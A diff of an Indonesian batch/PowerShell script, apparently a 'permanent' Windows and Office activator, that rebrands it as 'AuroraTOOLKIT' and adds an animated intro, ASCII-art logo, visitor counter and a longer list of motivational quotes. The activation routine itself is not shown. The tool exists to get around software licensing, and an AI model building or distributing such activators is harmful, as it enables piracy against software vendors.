@@ -1,7 +1,7 @@
 <# ::
 @echo off
-title // ACTIVATOR WINDOWS + OFFICE PERMANENT - INDOJAVA ONLINE - HINZDC X SARGA
-mode con cols=90 lines=38
+title // ACTIVATOR WINDOWS + OFFICE PERMANENT - AuroraTOOLKIT - HINZDC X SARGA
+mode con cols=90 lines=15
 color 0B
 
 :Begin UAC check and Auto-Elevate Permissions
@@ -38,6 +38,104 @@ goto :eof
 #>
 
 #-----------------------------------------------------------------------------------------
+
+Clear-Host
+$Host.UI.RawUI.WindowTitle = '> ACTIVATOR WINDOWS + OFFICE PERMANENT - AuroraTOOLKIT - HINZDC X SARGA'
+
+# Efek Neon Pulse: teks berkedip pelan
+function Neon-Pulse {
+    param(
+        [string]$Text,
+        [ConsoleColor]$Color = "Cyan",
+        [int]$Times = 3,
+        [int]$Speed = 180
+    )
+    for ($i = 1; $i -le $Times; $i++) {
+        Write-Host "`r$Text" -ForegroundColor White -NoNewline
+        Start-Sleep -Milliseconds $Speed
+        Write-Host "`r$Text" -ForegroundColor $Color -NoNewline
+        Start-Sleep -Milliseconds $Speed
+    }
+    write-host ""
+}
+
+# Write text with color and delay
+function Write-ColoredChar {
+    param(
+        [string]$Text,
+        [ConsoleColor]$Color = "White",
+        [int]$Delay = 30
+    )
+    $orig = $Host.UI.RawUI.ForegroundColor
+    $Host.UI.RawUI.ForegroundColor = $Color
+    Write-Host -NoNewline $Text
+    Start-Sleep -Milliseconds $Delay
+    $Host.UI.RawUI.ForegroundColor = $orig
+}
+
+# Type a whole word with color
+function Write-ColoredWord {
+    param(
+        [string]$Text,
+        [ConsoleColor]$Color = "White",
+        [int]$Delay = 20
+    )
+    foreach ($c in $Text.ToCharArray()) {
+        Write-ColoredChar $c $Color $Delay
+    }
+}
+
+
+# Aurora Toolkit Intro Animation
+function Show-AuroraIntro {
+
+    Write-Host ""
+    # AURORA TOOLKIT
+    $Aurora = @("                              A"," U"," R"," O"," R"," A")
+    $Toolkit = @("T"," O"," O"," L"," K"," I"," T")
+
+    foreach ($c in $Aurora) { Write-ColoredWord $c "Magenta" 10 }
+    Write-ColoredWord "   " "Gray" 0
+    foreach ($c in $Toolkit[0..3]) { Write-ColoredWord $c "Blue" 25 }
+    foreach ($c in $Toolkit[4..6]) { Write-ColoredWord $c "Red" 40 }
+
+    Start-Sleep -Seconds 1
+    Write-Host "`n"
+
+    # Powered by SARGA X HINZDC
+    Write-ColoredWord "                     P o w e r e d  b y" "yellow" 15
+    Write-ColoredWord "  S A R G A" "Red" 25
+    Write-ColoredWord "  X" "White" 20
+    Write-ColoredWord "  H I N Z D C" "Green" 25
+    Start-Sleep -Seconds 1
+    Write-Host "`n"
+
+    # SALAM SUKSES DAN SEHAT SELALU
+    Write-ColoredWord "                S A L A M  S U K S E S " "Red" 15
+    Write-ColoredWord "  D A N" "Green" 30
+    Write-ColoredWord "  S E H A T  S E L A L U" "Cyan" 30
+
+    Start-Sleep -Seconds 2
+    Write-Host "`n"
+    Write-ColoredWord "`n-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~`n`n" "DarkGray" 1
+    Start-Sleep -Milliseconds 800
+
+    # Execute message
+    Write-ColoredWord "   EXECUTE" "Blue" 30
+    Write-ColoredWord " CODE" "Red" 30
+    Write-ColoredWord "  >>" "White" 30
+    Write-ColoredWord "  ACTIVEAUTO.BAT  `n`n" "Cyan" 30
+    Start-Sleep -seconds 2
+    Neon-Pulse "    >> > Processing. . ." "Green" 10 100
+    Start-Sleep -Seconds 2
+    Write-Host "`n"
+}
+
+Show-AuroraIntro
+clear-host
+$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(90, 42)
+$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(90, 42)
+
 $ProgressPreference = 'SilentlyContinue'
 Add-Type @"
 using System;
@@ -138,33 +236,54 @@ $w = $rect.Right - $rect.Left
 $h = $rect.Bottom - $rect.Top
 
 # Pindahkan jendela ke posisi baru tanpa mengubah ukuran
-[Win32Functions.Win32]::MoveWindow($hwnd, 50, 50, $w, $h, $true)
+[Win32Functions.Win32]::MoveWindow($hwnd, 50, 10, $w, $h, $true)
 
 #-----------------------------------------------------------------------------------------
-$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(90, 38)
-$Host.UI.RawUI.WindowTitle = '// ACTIVATOR WINDOWS + OFFICE PERMANENT // - INDOJAVA ONLINE - HINZDC X SARGA'
+function Write-TypeWord {
+    param(
+        [string]$Text,
+        [ConsoleColor]$Color = "Cyan",
+        [int]$Delay = 35
+    )
+    $orig = $Host.UI.RawUI.ForegroundColor
+    $Host.UI.RawUI.ForegroundColor = $Color
+    foreach ($ch in $Text.ToCharArray()) {
+        Write-Host -NoNewline $ch
+        Start-Sleep -Milliseconds $Delay
+    }
+    Write-Host -NoNewline " "
+    $Host.UI.RawUI.ForegroundColor = $orig
+}
+
 Clear-DnsClientCache
 [Console]::OutputEncoding = [System.Text.Encoding]::utf8
+
 Clear-Host
 # ASCII Art dalam Unicode [char]
+$colorLogo = @("Cyan", "Blue", "Red", "White")
+$randomColor = Get-Random -InputObject $colorLogo
 $text = @"
 
                                                   $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
-         $([char]0x2554)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2567)$([char]0x2563) ISTANA BEC LANTAI 1 BLOK D7 $([char]0x2551)
-         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2563)
-         $([char]0x2551)   $([char]0x2588)$([char]0x2588)                                $([char]0x2588)$([char]0x2588)                               $([char]0x2551)
-         $([char]0x2551)   $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2584)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)      $([char]0x2591)$([char]0x2591) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
-         $([char]0x2551)   $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)      $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
-         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2580)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2580) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)   $([char]0x2551)
-         $([char]0x2551)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2580)$([char]0x2584) $([char]0x2592)$([char]0x2592)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)    $([char]0x2580)$([char]0x2588)$([char]0x2580)    $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2551)
+         $([char]0x2554)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2563)  OLIH X SARGA A.K.A HINZDC  $([char]0x2551)
+         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2563)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
          $([char]0x2551)                                                                      $([char]0x2551)
-         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
+         $([char]0x2551)        $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x255A)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2566)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x255D) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)         $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2591)$([char]0x2591)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588)$([char]0x2566)$([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2569)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591) $([char]0x2591)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
+         $([char]0x2551)                    $([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D) $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)                                         $([char]0x2551)
+         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
 "@
-
-Write-Host $text -ForegroundColor Cyan
-Write-Host "                         -- ACTIVATOR WINDOWS & OFFICE PERMANENT --" -ForegroundColor Red
+Write-Host $text -ForegroundColor $randomColor
+Neon-Pulse "                        -- ACTIVATOR WINDOWS & OFFICE PERMANENT --" "red" 8 200
 Write-Host "------------------------------------------------------------------------------------------"
-Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   " -foregroundColor White
+Write-TypeWord "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING  " "Green" 5
 Write-Host "------------------------------------------------------------------------------------------"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Start-Sleep -s 3
@@ -181,7 +300,7 @@ $url = "https://visitor-badge.imlete.cn/?id=activeauto"
 # Mengambil konten halaman web
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 
-# Memeriksa apakah respons berhasil
+# Memeriksa respon
 if ($response.StatusCode -eq 200) {
     # Mengambil konten HTML dari respons
     $htmlContent = $response.Content
@@ -193,94 +312,98 @@ if ($response.StatusCode -eq 200) {
         # Mencetak nilai ke terminal
         $label = Write-Host " DIAKSES " -BackgroundColor Blue -ForegroundColor White -NoNewline
         $number = Write-Host " $visitorCount " -BackgroundColor Red -ForegroundColor White -NoNewline
-        $times = Write-Host " KALI " -BackgroundColor White -ForegroundColor Black
+        $times = Write-Host " KALI " -BackgroundColor DarkBlue -ForegroundColor White
     } else {
         Write-Host " Please Connect to Internet.." -BackgroundColor Red -ForegroundColor White
     }
 } else {
     Write-Output "$($response.StatusCode)"
 }
-$null = $label
-$null = $number
-$null = $times
+$null = $label, $number, $times
 
 #-----------------------------------------------------------------------------------------
 # Array berisi kata-kata mutiara
 $kataMutiara = @(
-    "Janganlah engkau mengucapkan perkataan yang engkau sendiri tak suka mendengarnya jika orang lain mengucapkannya kepadamu."
-    "Jangan gunakan ketajaman kata-katamu pada ibumu yang mengajarimu cara berbicara."
-    "Kemarahan dimulai dengan kegilaan dan berakhir dengan penyesalan."
-    "Kesalahan terburuk kita adalah ketertarikan kita pada kesalahan orang lain."
-    "Jangan melibatkan hatimu dalam kesedihan atas masa lalu atau kamu tidak akan siap untuk apa yang akan datang."
-    "Barangsiapa menyalakan api fitnah, maka dia sendiri yang akan menjadi bahan bakarnya."
+    "Aku talah belajar selama bertahun-tahun bahwa bukan tempat tinggalmu yang penting, melainkan ora-orang yang ada di sekitarmu yang membuatmu merasa di rumah. -J.B. McGee"
+    "Tidak ada yang dapat membunuhmu lebih cepat daripada pikiranmu sendiri. Tetap tenang dan jangan stress atas hal-hal yang berada di luar kendalimu"
+    "Hindari berdebat dengan orang dungu, mereka akan menarikmu ke level mereka kemudian menghancurkanmu dengan pengalaman mereka. - Mark Twain"
+    "Dunia ini hanyalah bayangan, kejar bayangan itu, dan ia akan lari darimu. Tapi berpalinglah dari bayangan itu, maka ia akan mengikutimu."
     "Jangan menjelaskan tentang dirimu kepada siapapun, karena yang menyukaimu tidak butuh itu. Dan yang membencimu tidak percaya itu."
-    "Balas dendam terbaik adalah menjadikan dirimu lebih baik."
+    "Dia yang bertanya akan kelihatann bodoh selama 5 menit, tapi dia yang tidak berani bertanya akan bodoh selamanya. - Pepatah Cina"
+    "Apa yang membuatmu begitu takut kehilangan, jika sebenarnya tidak ada satu pun di dunia ini yang benar benar menjadi milikmu?"
+    "aku belajar bahwa setiap manusia akan merasakan kematian, tapi hanya sedikit yang benar-benar merasakan hidup. - Paulo Celho"
+    "Janganlah engkau mengucapkan perkataan yang engkau sendiri tak suka mendengarnya jika orang lain mengucapkannya kepadamu."
+    "Jangan merasa takut dengan rezeki yang tertunda, karena apa yang telah ditetapkan bagimu tidak akan pernah luput darimu."
+    "Jika kmau merasakan sakit, kamu hidup. Jika kamu merasakan sakit orang lain, kamu adalah seorang manusia - Leo Tolstoy."
+    "Ketika hendak melakukan perjalanan, janganlah meminta nasihat dari orang yan tidak pernah meninggalkan rumah. - Rumi"
+    "Apa yang kamu pikirkan tentang dirimu jauh lebih penting daripada apa yang orang lain pikirkan tentangmu. - Seneca"
+    "Ketika seseorang sedang tenggelam, itu bukanlah waktu yang tepat untuk mengajarinya cara berenang. - Pepatah Cina"
+    "Jika segala sesuatu di sekiatar kamu tampak gelap. coba lihat lagi, mungkin kamu yang memancarkan cahaya. - Rumi"
+    "Barangsiapa yang memperbaiki hubungannya dengan Allah, maka Allah akan memperbaiki hubungannya dengan manusia."
+    "Permasalahan dunia adalah orang cerdas penuh keraguan, dan orang bodoh penuh percaya diri. - Bertrand Russell"
+    "Jangan melibatkan hatimu dalam kesedihan atas masa lalu atau kamu tidak akan siap untuk apa yang akan datang."
+    "Kebodohan adalah penyakit yang paling mematikan, karena penderitanya tidak sadar sedang sakit. - Sokrates"
+    " Kemarin aku pintar, jadi aku ingin mengubah dunia. Hari ini aku bijak, jadi aku mengubah diriku sendiri."
+    "Hanya butuh 2 tahun untuk belajar berbicara dan enam puluh tahun untuk belajar diam. - Ernest Hemingway"
+    "Lebih mudah untuk menipu seseorang daripada meyakinkan mereka bahwa mereka telah ditipu. - Mark Twain"
+    "Sibodoh berdoa untuk jalan yang mudah, si bijak berdoa diberikan kaki yang kuat. - Pepatah Tiongkok"
     "Hiduplah seakan-akan kamu akan mati besok. Belajarlah seakan-akan kamu akan hidup untuk selamanya."
-    "Cara untuk memulai adalah dengan berhenti berbicara dan mulai melakukan."
+    "Terkadang, yang terbaik bukanlah mendapatkan semua jawaban, tetapi menikmati proses pencariannya."
+    "Banyak orang menjadi tidak menarik setelah kamu mengetahui cara berpikir mereka. - Damian Marley"
     "Dalam hidup, kamu akan mendapatkan teman, tetapi hanya satu yang sejati di saat-saat terburukmu."
-    "Hal-hal baik membutuhkan waktu, jadi bersikaplah positif dan sabar."
-    "Berhenti bermimpi, mulailah bekerja dan kejar impianmu."
-    "Perubahan dimulai dari langkah kecil."
-    "Bahagia itu sederhana, bersyukur saja."
-    "Keajaiban terjadi saat kamu percaya."
-    "Jadilah versi terbaik dirimu."
-    "Kebahagiaan datang dari hati yang tenang."
-    "Fokus pada solusi, bukan masalah."
-    "Mulai dari sekarang, jangan menunda."
-    "Hidup itu naik turun, nikmati perjalanannya."
-    "Kunci kebahagiaan adalah bersyukur."
-    "Jangan bandingkan dirimu dengan orang lain."
-    "Jadilah cahaya dalam kegelapan."
-    "Percayalah pada prosesnya."
-    "Hidup hanya sekali, jadikan berarti."
-    "Cintai dirimu sebelum mencintai orang lain."
-    "Jangan berhenti mencoba, jangan pernah menyerah."
-    "Keberhasilan datang dari keyakinan pada diri sendiri."
-    "Kebahagiaan sejati datang dari dalam."
-    "Tidak ada jalan pintas menuju puncak."
-    "Jangan hanya berlari, melesatlah."
-    "Kemarin aku pintar, jadi aku ingin mengubah dunia. Hari ini aku bijak, jadi aku mengubah diriku sendiri."
+    "Tidak ada yang bisa didapatkan tanpa kehilangan. Bahkan Surga menuntut kematian. - The Eagle"
     "Hiduplah seolah-olah kamu akan mati besok. Belajarlah seolah-olah kamu akan hidup selamanya."
+    "Berbahagialah dengan apa yang Allah takdirkan, karena itu adalah pilihan terbaik untukmu."
+    "Semakin panjang penjelasan, semakin besar kebohongan yang disembunyikan. - George Orwell"
+    "Orang kuat bukan yang pandai bergulat, tetapi yang mampu mengendalikan diri saat marah."
+    "Barangsiapa menyalakan api fitnah, maka dia sendiri yang akan menjadi bahan bakarnya."
+    "Jangan pernah berhenti belajar, karena kehidupan tidak pernah berhenti mengajarkan."
+    "Apa gunanya mengkhawatirkan sesuatu yang sudak tak terhindarkan - Hayao Miyazaki"
+    "Jangan gunakan ketajaman kata-katamu pada ibumu yang mengajarimu cara berbicara."
+    "Hujan turun sebelum pelangi muncul. Begitu juga kesulitan sebelum kebahagiaan."
+    "Waktu adalah pedang; jika kamu tidak memanfaatkannya, maka ia akan memotongmu."
+    "Satu-satunya hal yang lebih buruk daripada gagal adalah tidak pernah mencoba."
+    "Kesalahan terburuk kita adalah ketertarikan kita pada kesalahan orang lain."
+    "Jangan lihat siapa yang berbicara, tetapi lihatlah apa yang dia bicarakan."
+    "Cara untuk memulai adalah dengan berhenti berbicara dan mulai melakukan."
     "Hidupmu dibentuk oleh pikiranmu. Apa yang kamu pikirkan, itulah dirimu."
+    "Jangan biarkan kegagalan hari ini membuatmu berhenti mencoba esok hari."
+    "Keajaiban terjadi ketika kamu berani melangkah keluar dari zona nyaman."
     "Tidak peduli seberapa lambat kamu berjalan selama kamu tidak berhenti."
     "Jangan pernah menunda untuk besok apa yang bisa kamu lakukan hari ini."
     "Kualitas hidupmu ditentukan oleh kualitas pertanyaan yang kamu ajukan."
-    "Sebaik-baik manusia adalah yang paling bermanfaat bagi orang lain."
-    "Orang kuat bukan yang pandai bergulat, tetapi yang mampu mengendalikan diri saat marah."
-    "Berbahagialah dengan apa yang Allah takdirkan, karena itu adalah pilihan terbaik untukmu."
-    "Barangsiapa yang memperbaiki hubungannya dengan Allah, maka Allah akan memperbaiki hubungannya dengan manusia."
     "Ilmu itu seperti air, ia hanya mengalir ke tempat yang rendah hati."
-    "Jangan merasa takut dengan rezeki yang tertunda, karena apa yang telah ditetapkan bagimu tidak akan pernah luput darimu."
-    "Jangan lihat siapa yang berbicara, tetapi lihatlah apa yang dia bicarakan."
-    "Jika kamu menemukan kekurangan pada temanmu, tutupilah dengan nasihat, bukan cacian."
-    "Dunia ini hanyalah bayangan, kejar bayangan itu, dan ia akan lari darimu. Tapi berpalinglah dari bayangan itu, maka ia akan mengikutimu."
-    "Waktu adalah pedang; jika kamu tidak memanfaatkannya, maka ia akan memotongmu."
-    "Barang siapa mengenal dirinya, maka ia akan mengenal Tuhannya."
-    "Jika kmau merasakan sakit, kamu hidup. Jika kamu merasakan sakit orang lain, kamu adalah seorang manusia - Leo Tolstoy."
